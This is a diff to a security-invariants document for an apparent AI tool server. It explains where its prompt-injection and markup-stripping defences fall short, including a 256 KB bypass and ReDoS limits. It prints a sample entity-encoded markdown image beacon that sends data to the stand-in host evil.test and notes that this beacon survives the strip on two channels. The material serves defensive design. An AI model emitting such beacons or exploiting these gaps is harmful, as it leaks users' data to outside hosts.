@@ -76,40 +76,42 @@ what a violation looks like, it does not belong on this list.
    through sanitisation". An invariant that a defect can satisfy is not an
    invariant. **New text channels call `defendText`; they do not assemble their
    own pipeline**. Two channels narrow it with `decodeEntities: false` — the
-   header channel and the post-processor wrap. That is a deliberate narrowing,
-   not a weakening: the decode stage's output is *returned*, so on a channel
-   whose consumer does not decode it would manufacture live markup from inert
-   bytes (`LESSONS.md` RC-3). What it costs: Step 5 cannot unmask an
-   entity-encoded injection phrase on those two channels, so detection is blind
-   to that one vector there.
+   header channel and cURL stderr — because the decode stage's output is
+   *returned*, so on a channel whose consumer does not decode it would
+   manufacture live markup from inert bytes (`LESSONS.md` RC-3).
 
-   **Every text channel now calls `defendText`, and what that is worth depends
-   entirely on the sentence after it.** `post-processor.ts::processTextPart` —
-   the wrap, and the *only* defence for `registerCustomTool()` returns,
-   `beforeRequest` short-circuits and YAML endpoint results — takes it with
-   `contentTypeUndetermined: true`, because at that boundary the Content-Type
-   genuinely is gone. `jq-query.ts::executeJqQuery` takes it declaring
-   `JSON_MIME`, which its content is by construction.
+   **What that narrowing costs, stated correctly:** an entity-encoded beacon or
+   `<script>` block on those two channels **survives the strip**, not merely the
+   detection log. `![x](&#104;ttps://evil.test/?d=…)` is returned intact and a
+   renderer that decodes entity references will fetch it. An earlier revision of
+   this invariant described the cost as "Step 5 cannot unmask an entity-encoded
+   injection phrase", which understated it to a logging blindness. `LESSONS.md`
+   RC-12 records why the obvious fix — decode into a scratch copy — does not
+   resolve it, and `docs/todos/004` carries the open design question.
 
-   **The grammar a channel declares is where the real coverage question now
-   lives.** `defendText` on a JSON document IS sanitise-and-detect: the markup
-   and markdown stages are excluded, deliberately, because `<script>` and
-   `[a](b)` are legitimate inside JSON string values and `processResponse`
-   writes the post-strip content to disk. So "calls `defendText`" is a weaker
-   statement than it sounds, and reading it as "is fully stripped" is the same
-   mistake this invariant was written about. What the shared call buys is that
-   the exclusion is one decision in one place, reviewable, rather than a
-   subset each caller assembled. `LESSONS.md` RC-8 records why the JSON arm was
-   kept rather than closed.
+   **The grammar a channel declares is where the real coverage question lives.**
+   `defendText` on a JSON document runs sanitise-and-detect and no strip stage.
+   So "calls `defendText`" is a weaker statement than it sounds, and reading it
+   as "is fully stripped" is the same mistake this invariant was written about.
+   What the shared call buys is that the exclusion is one decision in one place,
+   reviewable, rather than a subset each caller assembled.
 
-   **Two results are marked exempt from the wrap's strip stages, and the tag is
-   the only thing that could weaken this invariant.** `curl_execute` and
-   `jq_query` mark their SUCCESS returns via `post-processor.ts::markDefended`,
-   because each already ran this pipeline under the content type the origin
-   declared — better information than the wrap has. Neither ERROR return is
-   marked. Untagged is the safe default: forgetting the tag costs a redundant
-   pass, forging it would cost Steps 3-5, and the symbol is module-private so
-   only the second is out of a consumer's reach.
+   **That exclusion is scoped to what gets persisted, and only to that.** It
+   exists because `processResponse` writes post-strip content to disk and
+   `jq_query` reads it back, so rewriting `<script>` or `[a](b)` inside a JSON
+   string value there would silently alter a document the origin sent. The
+   post-processor wrap has no disk artefact — a `registerCustomTool()` return
+   goes straight to the model — so it passes `excludeJsonDocuments: false` and a
+   beacon inside a JSON string value IS stripped before the model sees it.
+   Persisted keeps the exemption; returned does not. `LESSONS.md` RC-10.
+
+   **Above `STRIP_PATH_MAX_BYTES` (256 KB) every channel is Step 2 only.** The
+   cap is a cost circuit-breaker and it is not a defence; on the custom-tool
+   channel, where the wrap is the *only* defence, a handler returning more than
+   256 KB of remote markdown gets sanitise-and-detect alone. That is a stated
+   cost, not an oversight, and it is the reason the strip patterns must stay
+   linear rather than merely capped — see invariant 15.
+
 
 2. **DNS resolution precedes SSRF validation, and cURL is pinned to the validated
    IP.** Any change that lets cURL resolve a name itself reopens DNS rebinding.
@@ -152,6 +154,17 @@ what a violation looks like, it does not belong on this list.
     is unbounded in practice, whatever the gate reports. The cap is applied after
     the defence pipeline as well as before it, since `[link removed]` is longer
     than some of the forms it replaces.
+
+15. **Every regex in the strip path is linear in the size of its input, and the
+    byte cap is not what makes it so.** A `g`-flagged replace starts a match
+    attempt at every position, so a pattern that is linear *per attempt* is
+    quadratic *per pass*. `STRIP_PATH_MAX_BYTES` bounds the input, never the
+    cost: at 256 KB the pre-fix markdown patterns took 82 seconds and the block
+    patterns 4.5, synchronously, on the thread serving every session. A
+    violation looks like a failing match attempt that can scan an unbounded
+    distance forward — so the test is whether the character classes and anchors
+    make a failure O(1), not whether a cap exists. `LESSONS.md` RC-11 and the
+    ReDoS floods in `strip-blocks.test.ts`.
 
 ## Environments
 
